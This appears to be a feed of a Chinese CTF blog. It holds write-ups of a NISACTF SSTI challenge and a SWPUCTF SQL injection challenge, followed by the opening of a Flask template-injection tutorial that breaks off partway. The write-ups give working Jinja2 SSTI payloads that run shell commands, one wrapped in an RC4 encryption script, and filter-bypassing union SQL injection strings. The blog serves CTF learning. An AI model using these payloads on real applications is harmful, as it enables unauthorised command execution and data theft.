item.title: 【NISACTF 2022】is secret
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="nisactf-2022is-secret" class="heading-element"><span>[NISACTF 2022]is secret</span>
 <a href="#nisactf-2022is-secret" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>
<p>进入没信息，用dirsearch扫网站</p>
</li>
<li>
<p>发现可以传参，?secret=32423452523</p>
</li>
<li>
<p>报错后发现源码泄露</p>
<ul>
<li>存在一个RC4加密（看到密钥）</li>
<li>存在SSTI模板注入</li>
</ul>
</li>
<li>
<p>使用脚本把secret内容加密传入（RC4是对称加密）</p>
</li>
<li>
<p>使用SSTI-Flask模板注入</p>
</li>
</ul>
<h2 id="exp" class="heading-element"><span>EXP</span>
 <a href="#exp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>RC4加密代码</li>
</ul>
<blockquote>
<p>找了大佬的</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import base64
</span></span><span class="line"><span class="cl">from urllib.parse import quote
</span></span><span class="line"><span class="cl">def rc4_main(key = &#34;init_key&#34;, message = &#34;init_message&#34;):
</span></span><span class="line"><span class="cl"> # print(&#34;RC4加密主函数&#34;)
</span></span><span class="line"><span class="cl"> s_box = rc4_init_sbox(key)
</span></span><span class="line"><span class="cl"> crypt = str(rc4_excrypt(message, s_box))
</span></span><span class="line"><span class="cl"> return crypt
</span></span><span class="line"><span class="cl">def rc4_init_sbox(key):
</span></span><span class="line"><span class="cl"> s_box = list(range(256))
</span></span><span class="line"><span class="cl"> # print(&#34;原来的 s 盒：%s&#34; % s_box)
</span></span><span class="line"><span class="cl"> j = 0
</span></span><span class="line"><span class="cl"> for i in range(256):
</span></span><span class="line"><span class="cl"> j = (j + s_box[i] + ord(key[i % len(key)])) % 256
</span></span><span class="line"><span class="cl"> s_box[i], s_box[j] = s_box[j], s_box[i]
</span></span><span class="line"><span class="cl"> # print(&#34;混乱后的 s 盒：%s&#34;% s_box)
</span></span><span class="line"><span class="cl"> return s_box
</span></span><span class="line"><span class="cl">def rc4_excrypt(plain, box):
</span></span><span class="line"><span class="cl"> # print(&#34;调用加密程序成功。&#34;)
</span></span><span class="line"><span class="cl"> res = []
</span></span><span class="line"><span class="cl"> i = j = 0
</span></span><span class="line"><span class="cl"> for s in plain:
</span></span><span class="line"><span class="cl"> i = (i + 1) % 256
</span></span><span class="line"><span class="cl"> j = (j + box[i]) % 256
</span></span><span class="line"><span class="cl"> box[i], box[j] = box[j], box[i]
</span></span><span class="line"><span class="cl"> t = (box[i] + box[j]) % 256
</span></span><span class="line"><span class="cl"> k = box[t]
</span></span><span class="line"><span class="cl"> res.append(chr(ord(s) ^ k))
</span></span><span class="line"><span class="cl"> cipher = &#34;&#34;.join(res)
</span></span><span class="line"><span class="cl"> print(&#34;加密后的字符串是：%s&#34; %quote(cipher))
</span></span><span class="line"><span class="cl"> return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
</span></span><span class="line"><span class="cl">#固定rc4
</span></span><span class="line"><span class="cl">rc4_main(&#34;HereIsTreasure&#34;,&#34;{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat ../flag.txt&#39;).read()}}&#34;)
</span></span><span class="line"><span class="cl">#{{&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/flag.txt&#39;).read()}}</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>SSTI模板注入</li>
<li>找到os命令执行<code>{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}</code></li>
</ul>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>信息查找</li>
<li>RC4加密</li>
<li>SSTI模板注入</li>
</ul>

item.title: 【SWPUCTF 2021 新生赛】sql
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="swpuctf-2021-新生赛sql" class="heading-element"><span>[SWPUCTF 2021 新生赛]sql</span>
 <a href="#swpuctf-2021-%e6%96%b0%e7%94%9f%e8%b5%9bsql" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><h2 id="思路" class="heading-element"><span>思路</span>
 <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>使用常规字符型的联合注入起手</li>
<li>通过弹窗，在每个语句中找到对应的过滤内容，替换过滤内容</li>
<li>发现显示只有开头，使用函数获取每一段flag</li>
</ul>
<h2 id="exp" class="heading-element"><span>EXP</span>
 <a href="#exp" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ol>
<li>
<p>一开始在做闭合中发现<code>--+</code>被过滤，因为<code>+</code>表示空格</p>
<p>使用<code>#</code>后发现无回显，考虑用url编码<code>%23</code>.</p>
</li>
<li>
<p>发现有回显位，因此用联合注入</p>
</li>
<li>
<p>使用<code>order by</code>时发现了空格过滤 =&gt; 使用<code>/**/</code>替换绕过</p>
</li>
<li>
<p>开始爆破表格名，使用<code>where table_name=&quot;&quot;</code>时发现了 <code>=</code> 过滤 =&gt; 使用like替换，即：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">where/**/table_name/**/like LFLF_flag</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>同时发现<code>and</code>被过滤，直接限制表名，不要限制数据库即可</p>
</li>
<li>
<p>得到字段后直接查字段，发现查询到的字数出现限制</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?wllm=-1&#39;/**/union/**/select/**/1,2,flag/**/from/**/LFLF_flag</span></span></code></pre></td></tr></table>
</div>
</div><ol start="5">
<li>
<p>尝试使用right()函数，发现被过滤。</p>
</li>
<li>
<p>尝试使用mid()函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?wllm=-1&#39;union/**/select/**/1,mid(flag,1,20),3/**/from/**/LTLT_flag%23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?wllm=-1&#39;union/**/select/**/1,mid(flag,21,20),3/**/from/**/LTLT_flag%23
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?wllm=-1&#39;union/**/select/**/1,flag,41,20),3/**/from/**/LTLT_flag%23</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<h2 id="总结" class="heading-element"><span>总结</span>
 <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li></li>
</ul>

item.title: SSTI-Flask模板注入
item.author: ting10win@gmail.com (Ting)
item.description:
<h2 id="flask之ssti模版注入" class="heading-element"><span>Flask之SSTI模版注入</span>
 <a href="#flask%e4%b9%8bssti%e6%a8%a1%e7%89%88%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p>参考博客：[flask之ssti模版注入从零到入门](<a href="https://xz.aliyun.com/t/3679?time__1311=n4%2Bxnii%3DoGqmqDK0QDODlx6e0%3DWyK0KA%3DoK4iK%3Dx"target="_blank" rel="external nofollow noopener noreferrer">flask之ssti模版注入从零到入门 - 先知社区</a>)</p>
<h2 id="ssti漏洞框架" class="heading-element"><span>SSTI漏洞框架</span>
 <a href="#ssti%e6%bc%8f%e6%b4%9e%e6%a1%86%e6%9e%b6" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><ul>
<li>Python
<ul>
<li>Jinja2</li>
<li>mako</li>
<li>tornado</li>
<li>django</li>
</ul>
</li>
<li>PHP
<ul>
<li>smarty</li>
<li>twig</li>
</ul>
</li>
<li>Java
<ul>
<li>jade</li>
<li>velocity</li>
</ul>
</li>
</ul>
<h2 id="ssti漏洞成因" class="heading-element"><span>SSTI漏洞成因</span>
 <a href="#ssti%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p><strong>使用了渲染函数时</strong>，由于代码<strong>不规范或信任了用户输入</strong>而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
<h2 id="模板引擎" class="heading-element"><span>模板引擎</span>
 <a href="#%e6%a8%a1%e6%9d%bf%e5%bc%95%e6%93%8e" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p>模板引擎可以让（网站）程序实现<strong>界面与数据分离</strong>，<strong>业务代码与逻辑代码的分离</strong>，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。</p>
<p>虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板是用于从数据（变量）到实际的视觉表现（HTML代码）</p>
<p>实际：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>渲染主要分为：前端渲染和后端渲染。</p>
<ul>
<li>
<p>后端渲染</p>
<p>服务器计算，给用户呈现HEML字符串。前端只需要显示</p>
</li>
<li>
<p>前端渲染</p>
<p>浏览器从后端服务器得到信息，语言可能是json等数据包封装，也可能是html代码。但是需要浏览器前端来解析渲染成html代码呈现。</p>
</li>
</ul>
<h2 id="服务模板注入" class="heading-element"><span>服务模板注入</span>
 <a href="#%e6%9c%8d%e5%8a%a1%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h2><p>模板就是通过输入转换成特定的HTML文件，如一些博客页面，登录时候返回<code>hi,xxx</code>。</p>
<p>而这个<code>xxx</code>就是通过身份信息渲染成的html返回页面。</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$output = $twig-&gt;render( $_GET[‘custom_email’] , array(“first_name” =&gt; $user.first_name) );</span></span></code></pre></td></tr></table>
</div>
</div><p>本身就有xss漏洞，如果用<code>custom_emai</code>直接写<code>&lt;img&gt;alert(&quot;xss&quot;)&lt;/img&gt;</code></p>
<p>但是由于本身的不规范，还有这更严重的ssti漏洞</p>
<p>如果<code>url:xxxx/?custom_emai={{7*7}}</code>，会返回49的计算值</p>
<p>在<code>{{}}</code>里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。</p>
<h3 id="flask-框架的实例代码" class="heading-element"><span>flask 框架的实例代码</span>
 <a href="#flask-%e6%a1%86%e6%9e%b6%e7%9a%84%e5%ae%9e%e4%be%8b%e4%bb%a3%e7%a0%81" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app = Flask(__name__)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@app.route(&#39;/&#39;)
</span></span><span class="line"><span class="cl">def hello_world():
</span></span><span class="line"><span class="cl"> return &#34;Hello World&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if __name__ == &#39;__main__&#39;:
</span></span><span class="line"><span class="cl"> app.run()</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="route装饰器路由" class="heading-element"><span>route装饰器路由</span>
 <a href="#route%e8%a3%85%e9%a5%b0%e5%99%a8%e8%b7%af%e7%94%b1" class="heading-mark">
 <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
 </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@app.route(&#39;/&#39;)</span></span></code></pre></td></tr></table>
</div>
</div><p>选择url的定位</p>
<p><code>/</code> 表示网页根目录</p>
<p><code>/test</code>就需要用127.0.0.1:5000/test进入</p>
<p>如果设置动态网址可以写为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@app.route(&#34;/hello/&lt;username&gt;&#34;)
</span></span><span class="line"><span class="cl">def hello_user(username):
</span></span><span class="line"><span class="cl"> return &#34;user:%s&#34;%username</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="main入口" class="heading-element"><span>main入口</span>
 <a href="#main%e5%85%a5%e5%8f%a3" class="heading-mark">
